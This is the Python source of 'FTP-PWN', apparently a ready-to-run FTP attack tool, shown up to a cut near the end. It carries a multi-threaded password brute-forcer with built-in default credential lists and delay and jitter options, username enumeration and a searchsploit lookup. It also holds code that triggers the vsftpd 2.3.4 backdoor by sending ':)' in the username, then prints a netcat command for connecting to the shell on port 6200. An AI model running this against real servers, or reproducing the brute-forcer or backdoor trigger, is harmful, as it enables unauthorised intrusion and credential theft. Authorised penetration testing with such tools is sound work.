#!/usr/bin/env python3
"""
🥷🏻 FTP-PWN - Complete FTP Penetration Testing Tool
Author: cat0x01
Features:
    - Anonymous login check
    - Version detection & banner grabbing
    - Brute force attack (multi-threaded)
    - Searchsploit integration
    - Directory listing & file download
    - FTP bounce attack check
    - Writable directory check
"""

import socket
import ftplib
import sys
import os
import argparse
import threading
import subprocess
import time
import json
import random
import ssl
from queue import Queue
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# Colors
class C:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def banner():
    print(f"""{C.CYAN}{C.BOLD}
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                           ║
    ║     ███████╗████████╗██████╗       ██████╗ ██╗    ██╗███╗ ║
    ║     ██╔════╝╚══██╔══╝██╔══██╗      ██╔══██╗██║    ██║████╗║
    ║     █████╗     ██║   ██████╔╝█████╗██████╔╝██║ █╗ ██║██╔██║
    ║     ██╔══╝     ██║   ██╔═══╝ ╚════╝██╔═══╝ ██║███╗██║██║╚█║
    ║     ██║        ██║   ██║           ██║     ╚███╔███╔╝██║ ╚║
    ║     ╚═╝        ╚═╝   ╚═╝           ╚═╝      ╚══╝╚══╝ ╚═╝  ║
    ║                                                           ║
    ║         🥷🏻  FTP Penetration Testing Tool                  ║
    ║              Author: cat0x01                              ║
    ╚═══════════════════════════════════════════════════════════╝
    {C.RESET}""")

def log(msg, level="info"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    icons = {
        "info": f"{C.BLUE}[ℹ]{C.RESET}",
        "success": f"{C.GREEN}[✓]{C.RESET}",
        "warning": f"{C.YELLOW}[!]{C.RESET}",
        "error": f"{C.RED}[✗]{C.RESET}",
        "found": f"{C.GREEN}{C.BOLD}[+]{C.RESET}",
        "attack": f"{C.RED}[⚡]{C.RESET}",
    }
    icon = icons.get(level, icons["info"])
    print(f"{C.WHITE}[{timestamp}]{C.RESET} {icon} {msg}")

def save_result(filename, content):
    """Save results to file"""
    with open(filename, "a") as f:
        f.write(f"{content}\n")

def strip_ansi(text):
    import re
    return re.sub(r"\x1b\[[0-9;]*m", "", text)

def require_legal_ack(ack):
    if not ack:
        print(f"{C.RED}{C.BOLD}Legal notice:{C.RESET} Use this tool only on systems you own or have explicit permission to test.")
        print(f"{C.YELLOW}Re-run with --i-understand to confirm authorized use.{C.RESET}")
        sys.exit(1)

def create_ftp_client(host, port=21, timeout=10, use_tls=False):
    """Create FTP or FTPS client"""
    if use_tls:
        context = ssl.create_default_context()
        ftp = ftplib.FTP_TLS(context=context, timeout=timeout)
        ftp.connect(host, port)
        ftp.auth()
        ftp.prot_p()
        return ftp
    ftp = ftplib.FTP(timeout=timeout)
    ftp.connect(host, port)
    return ftp

# ==================== BANNER GRABBING ====================

def grab_banner(host, port=21, timeout=10, report=None):
    """Grab FTP banner and version"""
    log(f"Grabbing banner from {host}:{port}...", "info")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        banner = sock.recv(1024).decode().strip()
        sock.close()
        
        log(f"Banner: {C.CYAN}{banner}{C.RESET}", "success")
        if report is not None:
            report["banner"] = banner
        return banner
        
    except socket.timeout:
        log("Connection timed out", "error")
        return None
    except ConnectionRefusedError:
        log("Connection refused - FTP port may be closed", "error")
        return None
    except Exception as e:
        log(f"Error: {e}", "error")
        return None

def fingerprint_server(host, port=21, timeout=10, use_tls=False):
    """Try to collect extra fingerprints without logging in"""
    info = {"syst": None, "feat": [], "help": None}
    try:
        ftp = create_ftp_client(host, port, timeout, use_tls)
        try:
            info["syst"] = ftp.sendcmd("SYST")
        except:
            pass
        try:
            feat = ftp.sendcmd("FEAT")
            info["feat"] = feat.split('\n')
        except:
            pass
        try:
            info["help"] = ftp.sendcmd("HELP")
        except:
            pass
        try:
            ftp.quit()
        except:
            pass
    except Exception:
        pass
    return info

def extract_version(banner, extra_text=None):
    """Extract FTP version from banner and optional extra text"""
    if not banner and not extra_text:
        return None
    
    # Common patterns
    import re
    
    combined = "\n".join([t for t in [banner, extra_text] if t])
    patterns = [
        r'vsftpd\s*([\d.]+)',
        r'ProFTPD\s*([\d.]+)',
        r'Pure-FTPd\s*([\d.]+)?',
        r'FileZilla Server\s*([\d.]+)',
        r'Microsoft FTP Service',
        r'wu-ftpd\s*([\d.]+)',
        r'Apache FtpServer\s*([\d.]+)',
        r'([\d.]+)\s*FTP',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, combined, re.IGNORECASE)
        if match:
            return match.group(0)
    
    # Fallback to first non-empty line
    for line in combined.splitlines():
        if line.strip():
            return line.strip()[:50]
    return None

# ==================== ANONYMOUS LOGIN ====================

def check_anonymous(host, port=21, timeout=10, use_tls=False, report=None):
    """Check for anonymous FTP login"""
    log("Checking anonymous login...", "attack")
    
    anonymous_creds = [
        ("anonymous", "anonymous"),
        ("anonymous", ""),
        ("anonymous", "anonymous@"),
        ("ftp", "ftp"),
        ("ftp", ""),
        ("guest", "guest"),
        ("guest", ""),
    ]
    
    for username, password in anonymous_creds:
        try:
            ftp = create_ftp_client(host, port, timeout, use_tls)
            ftp.login(username, password)
            
            log(f"Anonymous login successful! {C.GREEN}{username}:{password}{C.RESET}", "found")
            
            # Get current directory
            try:
                pwd = ftp.pwd()
                log(f"Current directory: {pwd}", "info")
            except:
                pass
            
            # List files
            try:
                files = ftp.nlst()
                if files:
                    log(f"Files found: {len(files)}", "info")
                    for f in files[:10]:
                        print(f"    {C.CYAN}→{C.RESET} {f}")
                    if len(files) > 10:
                        print(f"    {C.YELLOW}... and {len(files)-10} more{C.RESET}")
                    if report is not None:
                        report["anonymous_login"]["files_sample"] = files[:20]
            except:
                pass
            
            ftp.quit()
            if report is not None:
                report["anonymous_login"] = {
                    "success": True,
                    "username": username,
                    "password": password,
                }
            return True, username, password
            
        except ftplib.error_perm:
            continue
        except Exception as e:
            continue
    
    log("Anonymous login failed", "warning")
    if report is not None:
        report["anonymous_login"] = {"success": False}
    return False, None, None

# ==================== BRUTE FORCE ====================

class FTPBruteForcer:
    def __init__(self, host, port=21, threads=10, timeout=5, delay=0.0, jitter=0.0, use_tls=False):
        self.host = host
        self.port = port
        self.threads = threads
        self.timeout = timeout
        self.delay = max(0.0, delay)
        self.jitter = max(0.0, jitter)
        self.use_tls = use_tls
        self.found = False
        self.lock = threading.Lock()
        self.attempts = 0
        self.credentials = None
        
    def try_login(self, username, password):
        """Try a single login attempt"""
        if self.found:
            return False
        
        with self.lock:
            self.attempts += 1
            if self.attempts % 100 == 0:
                print(f"\r{C.BLUE}[*]{C.RESET} Attempts: {self.attempts}", end="", flush=True)
        
        try:
            if self.delay:
                time.sleep(self.delay + (random.random() * self.jitter))
            ftp = create_ftp_client(self.host, self.port, self.timeout, self.use_tls)
            ftp.login(username, password)
            ftp.quit()
            
            with self.lock:
                if not self.found:
                    self.found = True
                    self.credentials = (username, password)
            return True
            
        except ftplib.error_perm:
            return False
        except:
            return False
    
    def brute_force(self, usernames, passwords):
        """Run brute force attack"""
        log(f"Starting brute force with {self.threads} threads...", "attack")
        log(f"Usernames: {len(usernames)}, Passwords: {len(passwords)}", "info")
        log(f"Total combinations: {len(usernames) * len(passwords)}", "info")
        
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for username in usernames:
                for password in passwords:
                    if self.found:
                        break
                    futures.append(
                        executor.submit(self.try_login, username.strip(), password.strip())
                    )
                if self.found:
                    break
            
            for future in as_completed(futures):
                if self.found:
                    break
        
        print()  # New line after progress
        
        elapsed = time.time() - start_time
        
        if self.found:
            log(f"Credentials found: {C.GREEN}{C.BOLD}{self.credentials[0]}:{self.credentials[1]}{C.RESET}", "found")
            log(f"Time: {elapsed:.2f}s, Attempts: {self.attempts}", "info")
            return self.credentials
        else:
            log(f"Brute force completed. No valid credentials found.", "warning")
            log(f"Time: {elapsed:.2f}s, Attempts: {self.attempts}", "info")
            return None

def load_wordlist(filepath):
    """Load wordlist from file"""
    if not os.path.exists(filepath):
        log(f"Wordlist not found: {filepath}", "error")
        return []
    
    with open(filepath, "r", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

# ==================== SEARCHSPLOIT ====================

def search_exploits(version_string, report=None):
    """Search for exploits using searchsploit"""
    if not version_string:
        log("No version string to search", "warning")
        return []
    
    log(f"Searching exploits for: {C.CYAN}{version_string}{C.RESET}", "attack")
    
    # Clean version string for search
    search_terms = [
        version_string,
        version_string.split()[0] if ' ' in version_string else version_string,
    ]
    
    exploits = []
    
    for term in search_terms:
        try:
            result = subprocess.run(
                ["searchsploit", term],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.stdout:
                lines = result.stdout.strip().split('\n')
                for line in lines:
                    if '|' in line and 'Exploit' not in line and '---' not in line:
                        exploits.append(strip_ansi(line))
            
            # Also try with FTP
            result2 = subprocess.run(
                ["searchsploit", "ftp", term],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result2.stdout:
                lines = result2.stdout.strip().split('\n')
                for line in lines:
                    if '|' in line and 'Exploit' not in line and '---' not in line:
                        cleaned = strip_ansi(line)
                        if cleaned not in exploits:
                            exploits.append(cleaned)
                            
        except FileNotFoundError:
            log("searchsploit not found. Install exploitdb package.", "error")
            return []
        except subprocess.TimeoutExpired:
            log("searchsploit timed out", "warning")
        except Exception as e:
            log(f"Error running searchsploit: {e}", "error")
    
    # Filter obvious non-server noise when query is generic
    filtered = []
    for exp in exploits:
        lower = exp.lower()
        if "ftp client" in lower:
            continue
        if "tftp" in lower:
            continue
        filtered.append(exp)
    exploits = filtered

    if exploits:
        log(f"Found {len(exploits)} potential exploits!", "found")
        print(f"\n{C.RED}{'='*70}{C.RESET}")
        for exp in exploits[:20]:
            print(f"{C.YELLOW}{exp}{C.RESET}")
        print(f"{C.RED}{'='*70}{C.RESET}\n")
        
        if len(exploits) > 20:
            log(f"... and {len(exploits)-20} more", "info")
    else:
        log("No exploits found in searchsploit database", "info")
    if report is not None:
        report["searchsploit"] = {
            "query": version_string,
            "results": exploits[:50],
        }
    
    return exploits

# ==================== VULNERABILITY CHECKS ====================

def check_bounce_attack(host, port=21, timeout=10, use_tls=False, report=None):
    """Check for FTP bounce attack vulnerability"""
    log("Checking for FTP bounce attack vulnerability...", "attack")
    
    try:
        ftp = create_ftp_client(host, port, timeout, use_tls)
        
        try:
            ftp.login("anonymous", "anonymous@")
        except:
            log("Need valid credentials to test bounce attack", "warning")
            return False
        
        # Try to use PORT command to a different host
        test_host = "127.0.0.1"
        test_port = 80
        
        # Calculate PORT command format
        h = test_host.replace(".", ",")
        p1 = test_port // 256
        p2 = test_port % 256
        
        try:
            response = ftp.sendcmd(f"PORT {h},{p1},{p2}")
            if response.startswith("200"):
                log(f"Server accepts PORT command - may be vulnerable to bounce attack!", "found")
                ftp.quit()
                if report is not None:
                    report["bounce_attack"] = {"vulnerable": True, "response": response}
                return True
        except:
            pass
        
        ftp.quit()
        log("Server does not appear vulnerable to bounce attack", "info")
        if report is not None:
            report["bounce_attack"] = {"vulnerable": False}
        return False
        
    except Exception as e:
        log(f"Error checking bounce attack: {e}", "error")
        return False

def check_writable_dirs(host, port=21, username="anonymous", password="anonymous@", timeout=10, use_tls=False, report=None):
    """Check for writable directories"""
    log("Checking for writable directories...", "attack")
    
    writable = []
    
    try:
        ftp = create_ftp_client(host, port, timeout, use_tls)
        ftp.login(username, password)
        
        # Get directory listing
        try:
            dirs = []
            ftp.retrlines('LIST', lambda x: dirs.append(x))
            
            for item in dirs:
                parts = item.split()
                if len(parts) >= 9:
                    perms = parts[0]
                    name = ' '.join(parts[8:])
                    
                    if perms.startswith('d'):  # Directory
                        # Check if writable
                        if 'w' in perms:
                            writable.append(name)
                            log(f"Writable directory: {C.GREEN}{name}{C.RESET}", "found")
            
            # Try to create test file
            test_file = f".test_{int(time.time())}"
            try:
                ftp.storbinary(f'STOR {test_file}', open('/dev/null', 'rb'))
                log(f"Current directory is writable! Uploaded: {test_file}", "found")
                ftp.delete(test_file)  # Clean up
                writable.append(".")
            except:
                pass
                
        except Exception as e:
            log(f"Error listing directories: {e}", "error")
        
        ftp.quit()
        
    except Exception as e:
        log(f"Error checking writable dirs: {e}", "error")
    
    if report is not None:
        report["writable_dirs"] = writable
    return writable

def check_known_vulns(banner, report=None):
    """Check for known vulnerabilities based on banner"""
    log("Checking for known vulnerabilities...", "attack")
    
    vulns = []
    banner_lower = banner.lower() if banner else ""
    
    # Known vulnerable versions
    known_vulns = [
        ("vsftpd 2.3.4", "CVE-2011-2523", "Backdoor command execution (port 6200)", "CRITICAL"),
        ("proftpd 1.3.3", "CVE-2010-4221", "Remote code execution via Telnet IAC buffer overflow", "CRITICAL"),
        ("proftpd 1.3.5", "CVE-2015-3306", "mod_copy arbitrary file read/write", "HIGH"),
        ("wu-ftpd 2.6.0", "CVE-2000-0573", "Remote root exploit", "CRITICAL"),
        ("filezilla server 0.9.4", "CVE-2006-6565", "Buffer overflow", "HIGH"),
        ("pure-ftpd 1.0.21", "CVE-2011-0418", "Directory traversal", "MEDIUM"),
    ]
    
    for version, cve, desc, severity in known_vulns:
        if version.lower() in banner_lower:
            vulns.append((version, cve, desc, severity))
            color = C.RED if severity == "CRITICAL" else C.YELLOW
            log(f"{color}[{severity}]{C.RESET} {cve}: {desc}", "found")
    
    # Check vsftpd 2.3.4 backdoor specifically
    if "vsftpd 2.3.4" in banner_lower:
        log(f"{C.RED}[!] VSFTPD 2.3.4 BACKDOOR DETECTED!{C.RESET}", "found")
        log("Try: nc <target> 6200 after sending ':)' as username", "info")
    
    if not vulns:
        log("No known vulnerabilities detected in banner", "info")
    if report is not None:
        report["known_vulns"] = [
            {"version": v, "cve": c, "desc": d, "severity": s} for v, c, d, s in vulns
        ]
    
    return vulns

def check_vsftpd_backdoor(host, timeout=5, report=None):
    """Check for vsftpd 2.3.4 backdoor"""
    log("Checking for vsftpd 2.3.4 backdoor...", "attack")
    
    try:
        # Trigger backdoor by sending :) in username
        ftp = ftplib.FTP(timeout=timeout)
        ftp.connect(host, 21)
        
        try:
            ftp.login("user:)", "pass")
        except:
            pass
        
        # Check if backdoor port is open
        time.sleep(1)
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, 6200))
            sock.close()
            
            if result == 0:
                log(f"{C.RED}{C.BOLD}VSFTPD BACKDOOR IS ACTIVE ON PORT 6200!{C.RESET}", "found")
                log(f"Connect with: nc {host} 6200", "found")
                if report is not None:
                    report["vsftpd_backdoor"] = {"active": True}
                return True
        except:
            pass
        
        log("vsftpd backdoor not detected", "info")
        if report is not None:
            report["vsftpd_backdoor"] = {"active": False}
        return False
        
    except Exception as e:
        log(f"Error checking backdoor: {e}", "error")
        return False

# ==================== FULL ENUMERATION ====================

def enumerate_ftp(host, port=21, username=None, password=None, timeout=10, use_tls=False, prefer_mlsd=True, report=None):
    """Full FTP enumeration after login"""
    log("Starting FTP enumeration...", "info")
    
    try:
        ftp = create_ftp_client(host, port, timeout, use_tls)
        
        if username:
            ftp.login(username, password or "")
        else:
            ftp.login("anonymous", "anonymous@")
        
        info = {
            "welcome": ftp.getwelcome(),
            "pwd": None,
            "system": None,
            "features": [],
            "files": [],
            "dirs": [],
            "items_sample": [],
        }
        
        # Current directory
        try:
            info["pwd"] = ftp.pwd()
            log(f"Current directory: {info['pwd']}", "info")
        except:
            pass
        
        # System info
        try:
            info["system"] = ftp.sendcmd("SYST")
            log(f"System: {info['system']}", "info")
        except:
            pass
        
        # Features
        try:
            ftp.sendcmd("FEAT")
            info["features"] = ftp.sendcmd("FEAT").split('\n')
            log(f"Features: {len(info['features'])} supported", "info")
        except:
            pass
        
        # Directory listing
        try:
            items = []
            if prefer_mlsd:
                try:
                    for name, facts in ftp.mlsd():
                        items.append({"name": name, "facts": facts})
                except:
                    prefer_mlsd = False
            if not prefer_mlsd:
                lines = []
                ftp.retrlines('LIST', lambda x: lines.append(x))
                items = lines
            
            print(f"\n{C.CYAN}{'='*60}{C.RESET}")
            print(f"{C.BOLD}Directory Listing:{C.RESET}")
            print(f"{C.CYAN}{'='*60}{C.RESET}")
            
            if prefer_mlsd:
                for item in items[:30]:
                    ftype = item.get("facts", {}).get("type", "?")
                    label = "[DIR]" if ftype == "dir" else "[FILE]" if ftype == "file" else "[???]"
                    color = C.BLUE if ftype == "dir" else C.GREEN if ftype == "file" else C.WHITE
                    print(f"  {color}{label}{C.RESET}  {item.get('name')}")
                    if ftype == "dir":
                        info["dirs"].append(item.get("name"))
                    elif ftype == "file":
                        info["files"].append(item.get("name"))
                    info["items_sample"].append(f"{label} {item.get('name')}")
            else:
                for item in items[:30]:
                    if item.startswith('d'):
                        print(f"  {C.BLUE}[DIR]{C.RESET}  {item}")
                        info["items_sample"].append(f"[DIR] {item}")
                    elif item.startswith('-'):
                        print(f"  {C.GREEN}[FILE]{C.RESET} {item}")
                        info["items_sample"].append(f"[FILE] {item}")
                    else:
                        print(f"  {C.WHITE}[???]{C.RESET}  {item}")
                        info["items_sample"].append(f"[???] {item}")
            
            if len(items) > 30:
                print(f"  {C.YELLOW}... and {len(items)-30} more items{C.RESET}")
            
            print(f"{C.CYAN}{'='*60}{C.RESET}\n")
            
        except Exception as e:
            log(f"Error listing directory: {e}", "error")
        
        ftp.quit()
        if report is not None:
            report["enumeration"] = info
        return info
        
    except Exception as e:
        log(f"Enumeration error: {e}", "error")
        return None

# ==================== EXTRA CHECKS ====================

def check_tls_support(host, port=21, timeout=10, report=None):
    """Check FTPS support and whether plaintext is allowed"""
    log("Checking TLS support (FTPS)...", "attack")
    tls_supported = False
    features = []
    try:
        ftp = ftplib.FTP(timeout=timeout)
        ftp.connect(host, port)
        try:
            feat = ftp.sendcmd("FEAT")
            features = feat.split('\n')
            for line in features:
                if "AUTH TLS" in line.upper():
                    tls_supported = True
        except:
            pass
        ftp.quit()
    except Exception as e:
        log(f"TLS check error: {e}", "error")
    log(f"FTPS supported: {tls_supported}", "info")
    if report is not None:
        report["ftps_support"] = {"supported": tls_supported, "features": features}
    return tls_supported

def check_user_enum(host, port=21, usernames=None, timeout=10, use_tls=False, report=None):
    """Heuristic user enumeration check with baseline comparison"""
    log("Checking for username enumeration...", "attack")
    if not usernames:
        usernames = ["admin", "root", "ftp", "user", "test", "guest", "administrator"]
    results = {"likely_valid": [], "responses": {}, "baseline": {}}
    try:
        ftp = create_ftp_client(host, port, timeout, use_tls)
        # Baseline with a definitely invalid username
        invalid_user = f"no_such_user_{int(time.time())}"
        try:
            base_resp = ftp.sendcmd(f"USER {invalid_user}")
            results["baseline"]["user"] = invalid_user
            results["baseline"]["response"] = base_resp
        except Exception as e:
            results["baseline"]["response"] = str(e)
            base_resp = None
        for user in usernames:
            try:
                resp = ftp.sendcmd(f"USER {user}")
                results["responses"][user] = resp
                # Heuristic: if response code/message differs from baseline, flag
                if base_resp and resp != base_resp:
                    results["likely_valid"].append(user)
            except Exception as e:
                results["responses"][user] = str(e)
        try:
            ftp.quit()
        except:
            pass
    except Exception as e:
        log(f"User enumeration error: {e}", "error")
    if results["likely_valid"]:
        log(f"Potential valid users (baseline diff): {', '.join(results['likely_valid'])}", "found")
    else:
        log("No obvious username enumeration signals", "info")
    if report is not None:
        report["user_enum"] = results
    return results

# ==================== INTERACTIVE MENU ====================

def interactive_menu(host, port=21, use_tls=False, timeout=10, prefer_mlsd=True, report=None):
    """Interactive menu for FTP pentesting"""
    
    banner_text = None
    version = None
    creds = None
    
    while True:
        print(f"""
{C.CYAN}{'='*60}{C.RESET}
{C.BOLD}FTP-PWN Menu{C.RESET} | Target: {C.GREEN}{host}:{port}{C.RESET}
{C.CYAN}{'='*60}{C.RESET}

  {C.YELLOW}[1]{C.RESET} Banner Grabbing / Version Detection
  {C.YELLOW}[2]{C.RESET} Check Anonymous Login
  {C.YELLOW}[3]{C.RESET} Brute Force Attack
  {C.YELLOW}[4]{C.RESET} Search Exploits (searchsploit)
  {C.YELLOW}[5]{C.RESET} Check Known Vulnerabilities
  {C.YELLOW}[6]{C.RESET} Check vsftpd 2.3.4 Backdoor
  {C.YELLOW}[7]{C.RESET} Check FTP Bounce Attack
  {C.YELLOW}[8]{C.RESET} Check Writable Directories
  {C.YELLOW}[9]{C.RESET} Full Enumeration
  {C.YELLOW}[B]{C.RESET} Check TLS Support (FTPS)
  {C.YELLOW}[C]{C.RESET} Check Username Enumeration
  {C.YELLOW}[A]{C.RESET} Run ALL Checks (Auto Mode)
  
  {C.RED}[0]{C.RESET} Exit

{C.CYAN}{'='*60}{C.RESET}
""")
        
        choice = input(f"{C.BOLD}Select option: {C.RESET}").strip().upper()
        
        if choice == "1":
            banner_text = grab_banner(host, port, timeout, report)
            extra = fingerprint_server(host, port, timeout, use_tls)
            extra_text = "\n".join([extra.get("syst") or "", " ".join(extra.get("feat", []))])
            if banner_text:
                version = extract_version(banner_text, extra_text)
                log(f"Detected version: {C.CYAN}{version}{C.RESET}", "info")
        
        elif choice == "2":
            success, user, passwd = check_anonymous(host, port, timeout, use_tls, report)
            if success:
                creds = (user, passwd)
        
        elif choice == "3":
            user_file = input(f"{C.BOLD}Username wordlist (or press Enter for default): {C.RESET}").strip()
            pass_file = input(f"{C.BOLD}Password wordlist (or press Enter for default): {C.RESET}").strip()
            
            # Default wordlists
            default_users = ["admin", "root", "ftp", "user", "test", "guest", "administrator", "ftpuser", "www", "web", "backup"]
            default_passes = ["admin", "password", "123456", "12345", "root", "toor", "pass", "ftp", "guest", "test", "1234", "admin123", "password123", ""]
            
            if user_file and os.path.exists(user_file):
                usernames = load_wordlist(user_file)
            else:
                log("Using default username list", "info")
                usernames = default_users
            
            if pass_file and os.path.exists(pass_file):
                passwords = load_wordlist(pass_file)
            else:
                log("Using default password list", "info")
                passwords = default_passes
            
            threads = int(input(f"{C.BOLD}Threads (default 10): {C.RESET}") or "10")
            
            bruteforcer = FTPBruteForcer(host, port, threads=threads, timeout=timeout, use_tls=use_tls)
            result = bruteforcer.brute_force(usernames, passwords)
            
            if result:
                creds = result
                save_result("ftp_creds.txt", f"{host}:{port} - {result[0]}:{result[1]}")
        
        elif choice == "4":
            if not version:
                banner_text = grab_banner(host, port, timeout, report)
                extra = fingerprint_server(host, port, timeout, use_tls)
                extra_text = "\n".join([extra.get("syst") or "", " ".join(extra.get("feat", []))])
                version = extract_version(banner_text, extra_text)
            
            if version:
                search_exploits(version, report)
            else:
                search_term = input(f"{C.BOLD}Enter search term: {C.RESET}").strip()
                if search_term:
                    search_exploits(search_term, report)
        
        elif choice == "5":
            if not banner_text:
                banner_text = grab_banner(host, port, timeout, report)
            check_known_vulns(banner_text, report)
        
        elif choice == "6":
            check_vsftpd_backdoor(host, report=report)
        
        elif choice == "7":
            check_bounce_attack(host, port, timeout, use_tls, report)
        
        elif choice == "8":
            if creds:
                check_writable_dirs(host, port, creds[0], creds[1], timeout, use_tls, report)
            else:
                check_writable_dirs(host, port, timeout=timeout, use_tls=use_tls, report=report)
        
        elif choice == "9":
            if creds:
                enumerate_ftp(host, port, creds[0], creds[1], timeout, use_tls, prefer_mlsd, report)
            else:
                enumerate_ftp(host, port, timeout=timeout, use_tls=use_tls, prefer_mlsd=prefer_mlsd, report=report)
        
        elif choice == "B":
            check_tls_support(host, port, timeout, report)
        
        elif choice == "C":
            user_file = input(f"{C.BOLD}Username list (optional file): {C.RESET}").strip()
            if user_file and os.path.exists(user_file):
                usernames = load_wordlist(user_file)
            else:
                usernames = None
            check_user_enum(host, port, usernames, timeout, use_tls, report)
        
        elif choice == "A":
            log("Running all checks in auto mode...", "attack")
            print()
            
            # Banner
            banner_text = grab_banner(host, port, timeout, report)
            extra = fingerprint_server(host, port, timeout, use_tls)
            extra_text = "\n".join([extra.get("syst") or "", " ".join(extra.get("feat", []))])
            version = extract_version(banner_text)
            if extra_text:
                version = extract_version(version, extra_text)
            print()
            
            # Known vulns
            check_known_vulns(banner_text, report)
            print()
            
            # vsftpd backdoor
            check_vsftpd_backdoor(host, report=report)
            print()
            
            # Anonymous login
            success, user, passwd = check_anonymous(host, port, timeout, use_tls, report)
            if success:
                creds = (user, passwd)
            print()
            
            # Searchsploit
            if version:
                search_exploits(version, report)
            print()

            # TLS support
            check_tls_support(host, port, timeout, report)
            print()

            # User enumeration
            check_user_enum(host, port, None, timeout, use_tls, report)
            print()
            
            # Enumeration if we have access
            if creds:
                enumerate_ftp(host, port, creds[0], creds[1], timeout, use_tls, prefer_mlsd, report)
                check_writable_dirs(host, port, creds[0], creds[1], timeout, use_tls, report)
            
            log("Auto scan complete!", "success")
        
        elif choice == "0":
            log("Exiting FTP-PWN. Happy hacking! 🥷🏻", "info")
            break
        
        else:
            log("Invalid option", "warning")
        
        input(f"\n{C.WHITE}Press Enter to continue...{C.RESET}")

# ==================== MAIN ====================

def main():
    parser = argparse.ArgumentParser(
        description="🥷🏻 FTP-PWN - Complete FTP Penetration Testing Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 ftp_pwn.py -t 192.168.1.1
  python3 ftp_pwn.py -t 192.168.1.1 --auto
  python3 ftp_pwn.py -t 192.168.1.1 --all
  python3 ftp_pwn.py -t 192.168.1.1 --brute -U users.txt -P passwords.txt
  python3 ftp_pwn.py -t 192.168.1.1 --anon
  python3 ftp_pwn.py -t 192.168.1.1 --vuln
        """
    )
    
    parser.add_argument("-t", "--target", required=True, help="Target host")
    parser.add_argument("-p", "--port", type=int, default=21, help="FTP port (default: 21)")
    parser.add_argument("--auto", action="store_true", help="Run all checks automatically")
    parser.add_argument("--all", action="store_true", help="Alias for --auto")
    parser.add_argument("--anon", action="store_true", help="Check anonymous login only")
    parser.add_argument("--banner", action="store_true", help="Grab banner only")
    parser.add_argument("--brute", action="store_true", help="Run brute force attack")
    parser.add_argument("-U", "--users", help="Username wordlist for brute force")
    parser.add_argument("-P", "--passwords", help="Password wordlist for brute force")
    parser.add_argument("--threads", type=int, default=10, help="Threads for brute force (default: 10)")
    parser.add_argument("--vuln", action="store_true", help="Check vulnerabilities only")
    parser.add_argument("--timeout", type=int, default=10, help="Connection timeout (default: 10)")
    parser.add_argument("--ftps", action="store_true", help="Use explicit FTPS (AUTH TLS)")
    parser.add_argument("--mlsd", action="store_true", help="Prefer MLSD for directory listing")
    parser.add_argument("--enum", action="store_true", help="Check for username enumeration")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay between brute-force attempts (seconds)")
    parser.add_argument("--jitter", type=float, default=0.0, help="Random jitter for brute-force delay (seconds)")
    parser.add_argument("--json", dest="json_out", help="Write JSON report to file")
    parser.add_argument("--report", help="Write text report to file")
    parser.add_argument("--i-understand", action="store_true", help="Confirm you are authorized to test this target")
    
    args = parser.parse_args()
    require_legal_ack(args.i_understand)
    
    banner()
    
    host = args.target
    port = args.port
    use_tls = args.ftps
    prefer_mlsd = args.mlsd
    report = {}
    report["meta"] = {
        "target": host,
        "port": port,
        "ftps": use_tls,
        "timeout": args.timeout,
        "mlsd": prefer_mlsd,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    
    log(f"Target: {host}:{port}", "info")
    
    # Quick mode commands
    if args.banner:
        banner_text = grab_banner(host, port, args.timeout, report)
        extra = fingerprint_server(host, port, args.timeout, use_tls)
        extra_text = "\n".join([extra.get("syst") or "", " ".join(extra.get("feat", []))])
        if banner_text:
            version = extract_version(banner_text, extra_text)
            log(f"Version: {version}", "info")
        if args.json_out:
            with open(args.json_out, "w") as f:
                json.dump(report, f, indent=2)
        return
    
    if args.anon:
        check_anonymous(host, port, args.timeout, use_tls, report)
        if args.json_out:
            with open(args.json_out, "w") as f:
                json.dump(report, f, indent=2)
        return
    
    if args.brute:
        usernames = load_wordlist(args.users) if args.users else ["admin", "root", "ftp", "user", "test"]
        passwords = load_wordlist(args.passwords) if args.passwords else ["admin", "password", "123456", "ftp", ""]
        
        bruteforcer = FTPBruteForcer(
            host,
            port,
            threads=args.threads,
            timeout=args.timeout,
            delay=args.delay,
            jitter=args.jitter,
            use_tls=use_tls,
        )
        bruteforcer.brute_force(usernames, passwords)
        if args.json_out:
            with open(args.json_out, "w") as f:
                json.dump(report, f, indent=2)
        return
    
    if args.vuln:
        banner_text = grab_banner(host, port, args.timeout, report)
        extra = fingerprint_server(host, port, args.timeout, use_tls)
        extra_text = "\n".join([extra.get("syst") or "", " ".join(extra.get("feat", []))])
        version = extract_version(banner_text, extra_text)
        check_known_vulns(banner_text, report)
        check_vsftpd_backdoor(host, report=report)
        if version:
            search_exploits(version, report)
        if args.json_out:
            with open(args.json_out, "w") as f:
                json.dump(report, f, indent=2)
        return
    
    if args.enum:
        usernames = load_wordlist(args.users) if args.users else None
        check_user_enum(host, port, usernames, args.timeout, use_tls, report)
        if args.json_out:
            with open(args.json_out, "w") as f:
                json.dump(report, f, indent=2)
        return
    
    if args.auto or args.all:
        # Run all checks automatically
        banner_text = grab_banner(host, port, args.timeout, report)
        extra = fingerprint_server(host, port, args.timeout, use_tls)
        extra_text = "\n".join([extra.get("syst") or "", " ".join(extra.get("feat", []))])
        version = extract_version(banner_text, extra_text)
        print()
        
        check_known_vulns(banner_text, report)
        print()
        
        check_vsftpd_backdoor(host, report=report)
        print()
        
        success, user, passwd = check_anonymous(host, port, args.timeout, use_tls, report)
        print()
        
        if version:
            search_exploits(version, report)
        
        check_tls_support(host, port, args.timeout, report)
        check_user_enum(host, port, None, args.timeout, use_tls, report)
        
        if success:
